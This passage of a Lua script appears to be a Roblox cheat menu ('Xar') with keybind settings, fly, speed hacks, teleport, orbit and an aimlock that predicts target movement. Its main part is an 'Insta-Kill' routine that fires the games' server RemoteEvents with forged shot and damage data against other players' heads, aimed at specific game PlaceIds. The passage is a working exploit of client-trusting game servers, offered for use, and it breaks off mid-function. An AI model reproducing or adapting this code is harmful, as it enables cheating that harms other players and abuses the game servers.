local FlySpeedInput = ConfigsTab:CreateInput({
	Name = "Fly Speed",
	CurrentValue = "100",
	PlaceholderText = "Speed",
	RemoveTextAfterFocusLost = false,
	Flag = "Input6537357360",
	Callback = function(Text)
		FlySpeed = tonumber(Text)
	end,
})

local SpeedKeyInput = ConfigsTab:CreateInput({
	Name = "Speed Keybind",
	CurrentValue = "Z",
	PlaceholderText = "Keybind",
	RemoveTextAfterFocusLost = false,
	Flag = "Input10632573573",
	Callback = function(Text)
		SpeedKeyConfig = Text
	end,
})

local SpeedInput = ConfigsTab:CreateInput({
	Name = "Speed",
	CurrentValue = "2",
	PlaceholderText = "Speed",
	RemoveTextAfterFocusLost = false,
	Flag = "Input0857857",
	Callback = function(Text)
		Speed = tonumber(Text)
	end,
})

local TpTargetKeyInput = ConfigsTab:CreateInput({
	Name = "Teleport To Last Target Keybind",
	CurrentValue = "T",
	PlaceholderText = "Keybind",
	RemoveTextAfterFocusLost = false,
	Flag = "Input10",
	Callback = function(Text)
		ResolverKeyConfig = Text
	end,
})

local FlingTargetKeyInput = ConfigsTab:CreateInput({
	Name = "Fling Target Keybind",
	CurrentValue = "H",
	PlaceholderText = "Keybind",
	RemoveTextAfterFocusLost = false,
	Flag = "Input11",
	Callback = function(Text)
		FlingTargetKeyConfig = Text
	end,
})

local NoclipKeyInput = ConfigsTab:CreateInput({
	Name = "Noclip Keybind",
	CurrentValue = "N",
	PlaceholderText = "Keybind",
	RemoveTextAfterFocusLost = false,
	Flag = "Input12",
	Callback = function(Text)
		NoclipKeyConfig = Text
	end,
})

local ESPKeyInput = ConfigsTab:CreateInput({
	Name = "ESP Keybind",
	CurrentValue = "L",
	PlaceholderText = "Keybind",
	RemoveTextAfterFocusLost = false,
	Flag = "Input13",
	Callback = function(Text)
		ESPKeyConfig = Text
	end,
})

local TracersToggle = ConfigsTab:CreateToggle({
    Name = "Tracers (ESP)",
    CurrentValue = false,
    Flag = "Toggle14",
    Callback = function(Value)
        TracersEnabled = Value
    end,
})

local ESP_ColorPicker = ConfigsTab:CreateColorPicker({
    Name = "ESP Color",
    Color = Color3.fromRGB(242, 243, 243),
    Flag = "ColorPicker1",
    Callback = function(Value)
		ESP_Color = Value
    end
})

-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --

--// Main Source Script \\--

local UIS = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local Player = game:GetService("Players").LocalPlayer
local Cam = workspace.CurrentCamera
local Mouse = Player:GetMouse()
local Character = Player.Character
local V_Active = false
local X_Active = false
local C_Active = false
local Z_Active = false
local Y_Active = false
local L_Active = false
local N_Active = false
local U_Active = false
local B_Active = false
local J_Active = false
local P_Active = false
local lastTarget = ""

local Offset = .1
--local Speed = true
local Height = 25
local Radius = 10

--// Code \\--

local function LockMethod(Method, Target)
    local Result
    task.spawn(function()
        local LockPart = Hit_Part
        local Target = Target.Parent:FindFirstChild(LockPart)
        if Target then
            local X, Y, Z
            if Method == "Velocity" then
                X = Target.Position.X + Target.Velocity.X * CamOffsetConfigX
                Y = Target.Position.Y + Target.Velocity.Y * CamOffsetConfigY
                Z = Target.Position.Z + Target.Velocity.Z * CamOffsetConfigX
            elseif Method == "MoveDirection" then
                X = Target.Position.X + (Target.Parent.Humanoid.MoveDirection.X * CamOffsetConfigX * Target.Parent.Humanoid.WalkSpeed)
                Y = Target.Position.Y + (Target.Parent.Humanoid.MoveDirection.Y * CamOffsetConfigY * Target.Parent.Humanoid.WalkSpeed)
                Z = Target.Position.Z + (Target.Parent.Humanoid.MoveDirection.Z * CamOffsetConfigX * Target.Parent.Humanoid.WalkSpeed)
            end

            local shakeMagnitude = CamShake
            local shakeX = (math.random() - 0.5) * shakeMagnitude
            local shakeY = (math.random() - 0.5) * shakeMagnitude
            local shakeZ = (math.random() - 0.5) * shakeMagnitude

            local targetPosition = Vector3.new(X + shakeX, Y + shakeY, Z + shakeZ)
            Result = targetPosition
        end
    end)
    return Result
end

--// Fly \\--

UIS.InputBegan:Connect(function(Input, IsTyping)
	if IsTyping then
		return
	end
	if Input.KeyCode == Enum.KeyCode[FlyKeyConfig] and FlyToggle == true then
		flying = not flying
		pcall(function()
			local humanoidRootPart = Player.Character:WaitForChild('HumanoidRootPart')
			if flying == false then
				humanoidRootPart.Velocity = Vector3.zero
			end
		end)
	end
end)

task.spawn(function()
	local camera = workspace.CurrentCamera
	local typing = false

	UIS.InputBegan:Connect(function(Input,IsTyping)
		if IsTyping then
			--typing = true
		else
			typing = false
		end
	end)

	game:GetService('RunService').RenderStepped:Connect(function()
		if flying then
			local moveDirection = Vector3.zero
			local lookVector = camera.CFrame.LookVector
			
			if UIS:IsKeyDown(Enum.KeyCode.W) and typing == false then
				moveDirection = moveDirection + lookVector
			end
			if UIS:IsKeyDown(Enum.KeyCode.S) and typing == false then
				moveDirection = moveDirection - lookVector
			end
			if UIS:IsKeyDown(Enum.KeyCode.A) and typing == false then
				moveDirection = moveDirection - camera.CFrame.RightVector
			end
			if UIS:IsKeyDown(Enum.KeyCode.D) and typing == false then
				moveDirection = moveDirection + camera.CFrame.RightVector
			end
			--[[if UIS:IsKeyDown(Enum.KeyCode.Space) and typing == false then
				moveDirection = moveDirection + Vector3.new(0, 1, 0)
			end
			if UIS:IsKeyDown(Enum.KeyCode.LeftShift) and typing == false then
				moveDirection = moveDirection - Vector3.new(0, 1, 0)
			end]]
			
			if moveDirection.Magnitude > 0 then
				moveDirection = moveDirection.Unit
			end

			local humanoidRootPart = Player.Character:WaitForChild('HumanoidRootPart')

			local currentCFrame = humanoidRootPart.CFrame
			local targetPosition = currentCFrame.Position + moveDirection * FlySpeed * game:GetService('RunService').Heartbeat:Wait()
			humanoidRootPart.CFrame = CFrame.new(targetPosition, targetPosition + lookVector)
		end
	end)
end)


--// Speed \\--

UIS.InputBegan:Connect(
	function(Input, IsTyping)
		if IsTyping then
			return
		end
		if Input.KeyCode == Enum.KeyCode[SpeedKeyConfig] and Z_Active == false then
			task.spawn(function()
				Z_Active = true
				task.spawn(function()
					while task.wait() do
						if Z_Active == true and SpeedToggle == true then
							Player.Character.HumanoidRootPart.CFrame = Player.Character.HumanoidRootPart.CFrame + (Player.Character.Humanoid.MoveDirection * (Speed))
						else
							Z_Active = false
							return
						end
					end
				end)
			end)
		elseif Input.KeyCode == Enum.KeyCode[SpeedKeyConfig] and Z_Active == true then
			Z_Active = false
		end
	end
)

--// Soft-Aim \\--

local cd = false

UIS.InputBegan:Connect(function(Input, IsTyping)
	if IsTyping then
		return
	end
	if Input.KeyCode == Enum.KeyCode[CamKeyConfig] and Camlock == true then
		if X_Active == false then
			X_Active = true

			local MaximumDistance = LockFOV
			local MaxDistance = LockDistance
			local nearestDistance = math.huge
			local nearestTarget = nil
		
			for i,v in next, game:GetService('Players'):GetPlayers() do
				pcall(function()
					if v.Name ~= Player.Name then
						if v.Character ~= nil then
							if v.Character:FindFirstChild("HumanoidRootPart") ~= nil then
								if v.Character:FindFirstChild("Humanoid") ~= nil and v.Character:FindFirstChild("Humanoid").Health ~= 0 then
									if v.Character:FindFirstChild('State') then
										if v.Character:FindFirstChild("State") ~= nil and v.Character.State:FindFirstChild("Down") ~= nil and v.Character.State["Down"].Value ~= true and v.Character.State["Carried"].Value ~= true then
											if FriendCheck == true then
												if not Player:IsFriendsWith(v.UserId) then
													task.spawn(function()
														local ScreenPoint = workspace.CurrentCamera:WorldToScreenPoint(v.Character:WaitForChild("HumanoidRootPart", math.huge).Position)
														local VectorDistance = (Vector2.new(UIS:GetMouseLocation().X, UIS:GetMouseLocation().Y) - Vector2.new(ScreenPoint.X, ScreenPoint.Y)).Magnitude
														local Mag = (v.Character.HumanoidRootPart.Position - Player.Character.HumanoidRootPart.Position).Magnitude
														if VectorDistance <= MaximumDistance and Mag <= MaxDistance and VectorDistance < nearestDistance then
															nearestDistance = VectorDistance
															nearestTarget = v
														end
													end)
												end
											else
												task.spawn(function()
													local ScreenPoint = workspace.CurrentCamera:WorldToScreenPoint(v.Character:WaitForChild("HumanoidRootPart", math.huge).Position)
													local VectorDistance = (Vector2.new(UIS:GetMouseLocation().X, UIS:GetMouseLocation().Y) - Vector2.new(ScreenPoint.X, ScreenPoint.Y)).Magnitude
													local Mag = (v.Character.HumanoidRootPart.Position - Player.Character.HumanoidRootPart.Position).Magnitude
													if VectorDistance <= MaximumDistance and Mag <= MaxDistance and VectorDistance < nearestDistance then
														nearestDistance = VectorDistance
														nearestTarget = v
													end
												end)
											end
										end
									elseif v.Character:FindFirstChild("BodyEffects") then
										if v.Character:FindFirstChild("BodyEffects") ~= nil and v.Character.BodyEffects:FindFirstChild("K.O") ~= nil and v.Character.BodyEffects["K.O"].Value ~= true and v.Character.BodyEffects["Grabbed"].Value ~= true then
											if FriendCheck == true then
												if not Player:IsFriendsWith(v.UserId) then
													task.spawn(function()
														local ScreenPoint = workspace.CurrentCamera:WorldToScreenPoint(v.Character:WaitForChild("HumanoidRootPart", math.huge).Position)
														local VectorDistance = (Vector2.new(UIS:GetMouseLocation().X, UIS:GetMouseLocation().Y) - Vector2.new(ScreenPoint.X, ScreenPoint.Y)).Magnitude
														local Mag = (v.Character.HumanoidRootPart.Position - Player.Character.HumanoidRootPart.Position).Magnitude
														if VectorDistance <= MaximumDistance and Mag <= MaxDistance and VectorDistance < nearestDistance then
															nearestDistance = VectorDistance
															nearestTarget = v
														end
													end)
												end
											else
												task.spawn(function()
													local ScreenPoint = workspace.CurrentCamera:WorldToScreenPoint(v.Character:WaitForChild("HumanoidRootPart", math.huge).Position)
													local VectorDistance = (Vector2.new(UIS:GetMouseLocation().X, UIS:GetMouseLocation().Y) - Vector2.new(ScreenPoint.X, ScreenPoint.Y)).Magnitude
													local Mag = (v.Character.HumanoidRootPart.Position - Player.Character.HumanoidRootPart.Position).Magnitude
													if VectorDistance <= MaximumDistance and Mag <= MaxDistance and VectorDistance < nearestDistance then
														nearestDistance = VectorDistance
														nearestTarget = v
													end
												end)
											end
										end
									end
								end
							end
						end
					end
				end)
			end
			task.wait()
			if nearestTarget == nil or nearestTarget == Player then
				X_Active = false
				--print('returned')
				return
			end
			s_lt = nearestTarget.Character
			lastTarget = nearestTarget
			task.spawn(function()
				repeat
				task.wait()
				if nearestTarget.Character:FindFirstChild('State') then
					if nearestTarget.Character == nil or nearestTarget.Character:FindFirstChild('Humanoid') == nil or nearestTarget.Character:FindFirstChild('Humanoid').Health == 0 or nearestTarget.Character.State:FindFirstChild("Down").Value == true then
						if UnlockOnKnocked == true then
							X_Active = false
						end
					end
				elseif nearestTarget.Character:FindFirstChild("BodyEffects") then
					if nearestTarget.Character == nil or nearestTarget.Character:FindFirstChild('Humanoid') == nil or nearestTarget.Character:FindFirstChild('Humanoid').Health == 0 or nearestTarget.Character.BodyEffects:FindFirstChild("K.O").Value == true then
						if UnlockOnKnocked == true then
							X_Active = false
						end
					end
				end
				until X_Active == false
			end)
			--nearestTarget.Character.HumanoidRootPart.Size = Vector3.new(15,8,10)
			while task.wait() do
				if X_Active == true then
					pcall(function()
						local part = nearestTarget.Character.HumanoidRootPart
						--nearestTarget.Character.HumanoidRootPart.CanCollide = false
						if U_Active == false then
							local Calculated_Offset = LockMethod("Velocity", part)
							if Smoothness ~= 0 then
								local tweenInfo = TweenInfo.new(Smoothness, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
								local tween = TweenService:Create(workspace.CurrentCamera, tweenInfo, {CFrame = CFrame.new(workspace.CurrentCamera.CFrame.Position, Calculated_Offset)})
								tween:Play()
								task.spawn(function()
									while tween.PlaybackState == Enum.PlaybackState.Playing do
										if X_Active == false then
											tween:Cancel()
											return
										end
										task.wait()
									end
								end)
							else
								workspace.CurrentCamera.CFrame = CFrame.new(workspace.CurrentCamera.CFrame.Position, Calculated_Offset)
							end
						else
							local Calculated_Offset = LockMethod("MoveDirection", part)
							if Smoothness ~= 0 then
								local tweenInfo = TweenInfo.new(Smoothness, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
								local tween = TweenService:Create(workspace.CurrentCamera, tweenInfo, {CFrame = CFrame.new(workspace.CurrentCamera.CFrame.Position, Calculated_Offset)})
								tween:Play()
								task.spawn(function()
									while tween.PlaybackState == Enum.PlaybackState.Playing do
										if X_Active == false then
											tween:Cancel()
											return
										end
										task.wait()
									end
								end)
							else
								workspace.CurrentCamera.CFrame = CFrame.new(workspace.CurrentCamera.CFrame.Position, Calculated_Offset)
							end
						end
						task.spawn(function()
							if nearestTarget.Character:FindFirstChild('State') then
								if J_Active == true and nearestTarget.Character.State["Down"].Value ~= true and nearestTarget.Character.State["Carried"].Value ~= true then
									pcall(function()
										if Player.Character:FindFirstChildOfClass('Tool') then
											if Player.Character:FindFirstChildOfClass('Tool'):FindFirstChild('GunScript') or Player.Character:FindFirstChildOfClass('Tool'):FindFirstChild('GunData') or Player.Character:FindFirstChildOfClass('Tool'):FindFirstChild('Ammo') then
												task.wait()
												local Target = nearestTarget.Character
												local Mag_Check = (Target.HumanoidRootPart.Position - Player.Character.HumanoidRootPart.Position).Magnitude

												game:GetService("ReplicatedStorage").Remote:FireServer('Shooting', game.Players.LocalPlayer.Character:FindFirstChildOfClass('Tool'))

												local ohString1 = "GunDamage"
												local ohInstance2 = game.Players.LocalPlayer.Character:FindFirstChildOfClass('Tool')
												local ohInstance3 = Target.Hitbox
												local ohInstance4 = Target.Humanoid
												local ohNil5 = nil
												local ohVector36 = Vector3.new(4, 5, 1.5)
												
												game:GetService("ReplicatedStorage").Remote:FireServer(ohString1, ohInstance2, ohInstance3, ohInstance4, ohNil5, ohVector36)
												game.Players.LocalPlayer.Character:FindFirstChildOfClass('Tool').Ammo_CLIENT.Value = game.Players.LocalPlayer.Character:FindFirstChildOfClass('Tool').Ammo.Value
												task.wait(.1)
											end
										end
									end)
								end
							elseif nearestTarget.Character:FindFirstChild('BodyEffects') then
								if J_Active == true and nearestTarget.Character.BodyEffects["K.O"].Value ~= true and nearestTarget.Character.BodyEffects["Grabbed"].Value ~= true then
									pcall(function()
										if Player.Character:FindFirstChildOfClass('Tool') then
											if Player.Character:FindFirstChildOfClass('Tool'):FindFirstChild('GunScript') or Player.Character:FindFirstChildOfClass('Tool'):FindFirstChild('GunData') or Player.Character:FindFirstChildOfClass('Tool'):FindFirstChild('Ammo') then
												task.spawn(function()
													if cd == false and P_Active == true then
														task.spawn(function()
															task.wait(.05)
															cd = true
															task.wait(.35)
															cd = false
														end)
														Vanish_Pause = true
														task.wait(.15)
														Vanish_Pause = false
													end
												end)

												if cd == true then return end
		
												--task.wait()
			
												local Target = nearestTarget.Character
			
												local Mag_Check = (Target.HumanoidRootPart.Position - Player.Character.HumanoidRootPart.Position).Magnitude
			
												if game.PlaceId == 9825515356 and Mag_Check <= InstaKill_Distance then
													if ForceFieldCheck == true and Target:FindFirstChild('ForceField') == nil then
														--if Vanish == true and P_Active == true then
															--task.wait(.1)
														--end
														--[[local args = {
															[1] = "GunCheck"
														}
														
														game:GetService("ReplicatedStorage").MainFunction:InvokeServer(unpack(args))]]
														
														--task.wait()
														
														local args = {
															[1] = "Shoot",
															[2] = {
																[1] = {
																	[1] = {
																		["Instance"] = Target.Head,
																		["Normal"] = Target.Head.Position,
																		["Position"] = Target.Head.Position
																	}
																},
																[2] = {
																	[1] = {
																		["thePart"] = Target.Head,
																		["theOffset"] = CFrame.new(0, 0, 0)
																	}
																},
																[3] = game.Players.LocalPlayer.Character.HumanoidRootPart.Position,
																[4] = Target.Head.Position,
																[5] = tick()
															}
														}
														
														if P_Active == false then
															game:GetService("ReplicatedStorage").MainEvent:FireServer(unpack(args))
														elseif Vanish == true and P_Active == true and Vanish_Pause == true then
															game:GetService("ReplicatedStorage").MainEvent:FireServer(unpack(args))
														end

														--task.wait()
													elseif ForceFieldCheck == false then
														if nearestTarget.Character.BodyEffects["K.O"].Value == false then
															--[[local args = {
																[1] = "GunCheck"
															}
															
															game:GetService("ReplicatedStorage").MainFunction:InvokeServer(unpack(args))]]
															
															--task.wait()
															
															local args = {
																[1] = "Shoot",
																[2] = {
																	[1] = {
																		[1] = {
																			["Instance"] = Target.Head,
																			["Normal"] = Target.Head.Position,
																			["Position"] = Target.Head.Position
																		}
																	},
																	[2] = {
																		[1] = {
																			["thePart"] = Target.Head,
																			["theOffset"] = CFrame.new(0, 0, 0)
																		}
																	},
																	[3] = game.Players.LocalPlayer.Character.HumanoidRootPart.Position,
																	[4] = Target.Head.Position,
																	[5] = tick()
																}
															}
															
															if P_Active == false then
																game:GetService("ReplicatedStorage").MainEvent:FireServer(unpack(args))
															elseif Vanish == true and P_Active == true and Vanish_Pause == true then
																game:GetService("ReplicatedStorage").MainEvent:FireServer(unpack(args))
															end
															--task.wait()
														end
														--task.wait(.1)
													end
												elseif game.PlaceId ~= 9825515356 then
													if ForceFieldCheck == true and Target:FindFirstChild('ForceField') == nil then
														if Vanish == true and P_Active == true then
															task.wait()
														end
														local args = {
															[1] = "Shoot"
														}
													
														game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool").RemoteEvent:FireServer(unpack(args))
													
														local args = {
															[1] = "ShootGun",
															[2] = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool").Handle,
															[3] = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool").Handle.Position,
															[4] = Target.Head.Position,
															[5] = Target.Head,
															[6] = Vector3.new(0, 1, 0)
														}
													
														game:GetService("ReplicatedStorage").MainEvent:FireServer(unpack(args))
					
														local args = {
															[1] = "ShootGun",
															[2] = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool").Handle,
															[3] = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool").Handle.Position,
															[4] = Target.HumanoidRootPart.Position,
															[5] = Target.HumanoidRootPart,
															[6] = Vector3.new(0, 1, 0)
														}
													
														game:GetService("ReplicatedStorage").MainEvent:FireServer(unpack(args))
													
														game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool").RemoteEvent:FireServer()
													elseif ForceFieldCheck == false then
														local args = {
															[1] = "Shoot"
														}
													
														game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool").RemoteEvent:FireServer(unpack(args))
													
														local args = {
															[1] = "ShootGun",
															[2] = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool").Handle,
															[3] = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool").Handle.Position,
															[4] = Target.Head.Position,
															[5] = Target.Head,
															[6] = Vector3.new(0, 1, 0)
														}
													
														game:GetService("ReplicatedStorage").MainEvent:FireServer(unpack(args))
					
														local args = {
															[1] = "ShootGun",
															[2] = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool").Handle,
															[3] = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool").Handle.Position,
															[4] = Target.HumanoidRootPart.Position,
															[5] = Target.HumanoidRootPart,
															[6] = Vector3.new(0, 1, 0)
														}
													
														game:GetService("ReplicatedStorage").MainEvent:FireServer(unpack(args))
													
														game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool").RemoteEvent:FireServer()
													end
													task.wait(.1)
												end
											end
										end
									end)
								end
							end
						end)
					end)
				else
					return
				end
			end
		elseif X_Active == true then
			X_Active = false
		end
	end
end)

--// Insta-Kill Toggle \\--

UIS.InputBegan:Connect(function(Input, IsTyping)
	if IsTyping then
		return
	end
    if Input.KeyCode == Enum.KeyCode[InstaKillToggleConfig] and InstantKillVal == true then
        J_Active = not J_Active
		Rayfield:Notify({
			Title = "Xar | Insta-Kill Toggle",
			Content = tostring(J_Active),
			Duration = 3.5,
			Image = 4483362458,
		 })
    end
end)

--// Orbit \\--

UIS.InputBegan:Connect(
	function(Input, IsTyping)
		if IsTyping then
			return
		end
		if Input.KeyCode == Enum.KeyCode[OrbitKeyConfig] and Orbit == true then
			if V_Active == false then
					V_Active = true

                    -- NORMAL VERSION

                    local nearestTarget = ""
                    local nearestDistance = math.huge
    
                    local Max_Distance = math.huge
                    for i, v in ipairs(game.Players:GetPlayers()) do
                        if v ~= Player and v.Character and v.Character:FindFirstChild("Humanoid") and v.Character:FindFirstChild("Humanoid").Health ~= 0 and v.Character:FindFirstChild('HumanoidRootPart') ~= nil then
							if v.Character:FindFirstChild('State') then
								if v.Character:FindFirstChild("State") ~= nil and v.Character.State:FindFirstChild("Down") ~= nil and v.Character.State["Carried"].Value ~= true then
									if FriendCheck == true then
										if not Player:IsFriendsWith(v.UserId) then
											local TargetHRP = v.Character:WaitForChild('HumanoidRootPart')
											local mag = (Mouse.Hit.Position - TargetHRP.Position).magnitude
											if mag < nearestDistance and mag <= Max_Distance then
												nearestDistance = mag
												nearestTarget = v
											end
										end
									else
										local TargetHRP = v.Character:WaitForChild('HumanoidRootPart')
										local mag = (Mouse.Hit.Position - TargetHRP.Position).magnitude
										if mag < nearestDistance and mag <= Max_Distance then
											nearestDistance = mag
											nearestTarget = v
										end
									end
								end
							elseif v.Character:FindFirstChild('BodyEffects') then
								if v.Character:FindFirstChild("BodyEffects") ~= nil and v.Character.BodyEffects:FindFirstChild("K.O") ~= nil and v.Character.BodyEffects["K.O"].Value ~= true then
									if FriendCheck == true then
										if not Player:IsFriendsWith(v.UserId) then
											local TargetHRP = v.Character:WaitForChild('HumanoidRootPart')
											local mag = (Mouse.Hit.Position - TargetHRP.Position).magnitude
											if mag < nearestDistance and mag <= Max_Distance then
												nearestDistance = mag
												nearestTarget = v
											end
										end
									else
										local TargetHRP = v.Character:WaitForChild('HumanoidRootPart')
										local mag = (Mouse.Hit.Position - TargetHRP.Position).magnitude
										if mag < nearestDistance and mag <= Max_Distance then
											nearestDistance = mag
											nearestTarget = v
										end
									end
								end
							end
                        end
                    end
                    if nearestTarget == "" or nearestTarget == Player then
                        return
                    end
                    lastTarget = nearestTarget
                    pcall(
                        function()
                            local center = nearestTarget.Character:WaitForChild('HumanoidRootPart')
                            local planet = Player.Character:WaitForChild('HumanoidRootPart')
                            local ORBIT_TIME = .1
                            local RADIUS = OrbitRadiusConfig
                            local ECLIPSE = 1
                            local ROTATION = CFrame.Angles(0, 0, 0)
                            local sin, cos = math.sin, math.cos
                            local ROTSPEED = math.pi * 2 / ORBIT_TIME
                            ECLIPSE = ECLIPSE * RADIUS
                            local rot = 0
                            --nearestTarget.Character:WaitForChild('HumanoidRootPart').CanCollide = false
                            game:GetService("RunService").Stepped:Connect(
                            function(t, dt)
                                if V_Active == false then
                                    planet = nil
                                    center = nil
                                    if nearestTarget ~= nil and nearestTarget.Character ~= nil and nearestTarget.Character.HumanoidRootPart ~= nil then
                                    end
                                    nearestTarget = ""
                                    return
                                elseif Armor_Busy == false then
									if nearestTarget.Character == nil then return end
									local RADIUS = OrbitRadiusConfig
									ECLIPSE = 1 * RADIUS
                                    rot = rot + dt * OrbitSpeedConfig
                                    planet.CFrame =
                                        ROTATION * CFrame.new(sin(rot) * ECLIPSE, OrbitHeightConfig, cos(rot) * RADIUS) +
                                        center.Position

										task.spawn(function()
											if J_Active == true then
											--pcall(function()
												if Player.Character:FindFirstChildOfClass('Tool') and Player.Character:FindFirstChildOfClass('Tool'):FindFirstChild('GunScript') or Player.Character:FindFirstChildOfClass('Tool'):FindFirstChild('GunData') or Player.Character:FindFirstChildOfClass('Tool'):FindFirstChild('Ammo') then
													--if V_Db == false then
													task.spawn(function()
														Vanish_Pause = true
														task.wait(.5)
														Vanish_Pause = false
													end)
													--end
													task.wait(.1)
				
													local Target = nearestTarget.Character
			
													local Mag_Check = (Target.HumanoidRootPart.Position - Player.Character.HumanoidRootPart.Position).Magnitude

													if game.PlaceId == 9825515356 and Mag_Check <= InstaKill_Distance and Target:FindFirstChild('ForceField') == nil then
														if ForceFieldCheck == true and Target:FindFirstChild('ForceField') == nil then
															local args = {
																[1] = "GunCheck"
															}
															
															game:GetService("ReplicatedStorage").MainFunction:InvokeServer(unpack(args))
															
															task.wait()
															
															local args = {
																[1] = "Shoot",
																[2] = {
																	[1] = {
																		[1] = {
																			["Instance"] = Target.Head,
																			["Normal"] = Target.Head.Position,
																			["Position"] = Target.Head.Position
																		}
																	},
																	[2] = {
																		[1] = {
																			["thePart"] = Target.Head,
																			["theOffset"] = CFrame.new(0, 0, 0)
																		}
																	},
																	[3] = game.Players.LocalPlayer.Character:FindFirstChildOfClass('Tool').Handle.Position,
																	[4] = Target.Head.Position,
																	[5] = tick()
																}
															}
															
															game:GetService("ReplicatedStorage").MainEvent:FireServer(unpack(args))
															task.wait(.1)
														elseif ForceFieldCheck == false then
															local args = {
																[1] = "GunCheck"
															}
															
															game:GetService("ReplicatedStorage").MainFunction:InvokeServer(unpack(args))
															
															task.wait()
															
															local args = {
																[1] = "Shoot",
																[2] = {
																	[1] = {
																		[1] = {
																			["Instance"] = Target.Head,
																			["Normal"] = Target.Head.Position,
																			["Position"] = Target.Head.Position
																		}
																	},
																	[2] = {
																		[1] = {
																			["thePart"] = Target.Head,
																			["theOffset"] = CFrame.new(0, 0, 0)
																		}
																	},
																	[3] = game.Players.LocalPlayer.Character:FindFirstChildOfClass('Tool').Handle.Position,
																	[4] = Target.Head.Position,
																	[5] = tick()
																}
															}
															
															game:GetService("ReplicatedStorage").MainEvent:FireServer(unpack(args))
															task.wait(.1)
														end
													elseif game.PlaceId == 82673729815802 then
														game:GetService("ReplicatedStorage").Remote:FireServer('Shooting', game.Players.LocalPlayer.Character:FindFirstChildOfClass('Tool'))
														
														local ohString1 = "GunDamage"
														local ohInstance2 = game.Players.LocalPlayer.Character:FindFirstChildOfClass('Tool')
														local ohInstance3 = Target.Hitbox
														local ohInstance4 = Target.Humanoid
														local ohNil5 = nil
														local ohVector36 = Vector3.new(4, 5, 1.5)

														game:GetService("ReplicatedStorage").Remote:FireServer(ohString1, ohInstance2, ohInstance3, ohInstance4, ohNil5, ohVector36)
														game.Players.LocalPlayer.Character:FindFirstChildOfClass('Tool').Ammo_CLIENT.Value = game.Players.LocalPlayer.Character:FindFirstChildOfClass('Tool').Ammo.Value
														task.wait(.1)
													elseif game.PlaceId ~= 9825515356 then
				
													local args = {
														[1] = "Shoot"
													}
												
													game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool").RemoteEvent:FireServer(unpack(args))
												
													local args = {
														[1] = "ShootGun",
														[2] = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool").Handle,
														[3] = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool").Handle.Position,
														[4] = Target.Head.Position,
														[5] = Target.Head,
														[6] = Vector3.new(0, 1, 0)
													}
												
													game:GetService("ReplicatedStorage").MainEvent:FireServer(unpack(args))
			
													local args = {
														[1] = "ShootGun",
														[2] = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool").Handle,
														[3] = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool").Handle.Position,
														[4] = Target.HumanoidRootPart.Position,
														[5] = Target.HumanoidRootPart,
														[6] = Vector3.new(0, 1, 0)
													}
												
													game:GetService("ReplicatedStorage").MainEvent:FireServer(unpack(args))
												
													game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool").RemoteEvent:FireServer()
													task.wait(.1)
												end
												end
											--end)
											end
										end)
                                end
                            end
                            )
                        end
                    )
                    while task.wait() do
                        if V_Active == true then
                            pcall(
                                function()
                                    local part = nearestTarget.Character:WaitForChild('HumanoidRootPart')
                                    if U_Active == false then
                                        local Calculated_Offset = LockMethod("Velocity", part)
                                        workspace.CurrentCamera.CFrame = CFrame.new(workspace.CurrentCamera.CFrame.Position, Calculated_Offset)
                                    else
                                        local Calculated_Offset = LockMethod("MoveDirection", part)
                                        workspace.CurrentCamera.CFrame = CFrame.new(workspace.CurrentCamera.CFrame.Position, Calculated_Offset)
                                    end
                                end
                            )
                        else
                            return
                        end
                    end
			elseif V_Active == true then
				V_Active = false
			end
		end
	end
)

--// TP \\--

UIS.InputBegan:Connect(
	function(Input, IsTyping)
		if IsTyping then
			return
		end
		if Input.KeyCode == Enum.KeyCode[TpTargetKeyConfig] and TpTarget == true then
			-- Player.Character.HumanoidRootPart.CFrame = lastTarget.Character.UpperTorso.CFrame * CFrame.new(0, 2.75, 0)
			local orientation = Player.Character.HumanoidRootPart.CFrame - Player.Character.HumanoidRootPart.Position
            local newPosition = lastTarget.Character.UpperTorso.Position
            Player.Character.HumanoidRootPart.CFrame = orientation + newPosition
		end
	end
)

--// Insta-Kill Last Target \\--

UIS.InputBegan:Connect(
	function(Input, IsTyping)
		if IsTyping then
			return
		end
		if Input.KeyCode == Enum.KeyCode[InstaKillConfig] and InstantKill == true then
			if C_Active == false then
				C_Active = true
                    pcall(
                        function()
							local nearestTarget = lastTarget
                            local center = nearestTarget.Character.HumanoidRootPart
                            local planet = Player.Character.HumanoidRootPart
                            local ORBIT_TIME = .1
                            local RADIUS = OrbitRadiusConfig
                            local ECLIPSE = 1
                            local ROTATION = CFrame.Angles(0, 0, 0)
                            local sin, cos = math.sin, math.cos
                            local ROTSPEED = math.pi * 2 / ORBIT_TIME
                            ECLIPSE = ECLIPSE * RADIUS
                            local rot = 0
                            --nearestTarget.Character.HumanoidRootPart.Size = Vector3.new(35,38,35)
                            --nearestTarget.Character.HumanoidRootPart.Transparency = 1
                            --nearestTarget.Character.HumanoidRootPart.CanCollide = false
                            game:GetService("RunService").Stepped:Connect(
                            function(t, dt)
                                if C_Active == false then
                                    planet = nil
                                    center = nil
                                    if nearestTarget ~= nil and nearestTarget.Character ~= nil and nearestTarget.Character.HumanoidRootPart ~= nil then
                                    --nearestTarget.Character:WaitForChild('HumanoidRootPart').Size = Vector3.new(2,2,1)
                                    end
                                    nearestTarget = ""
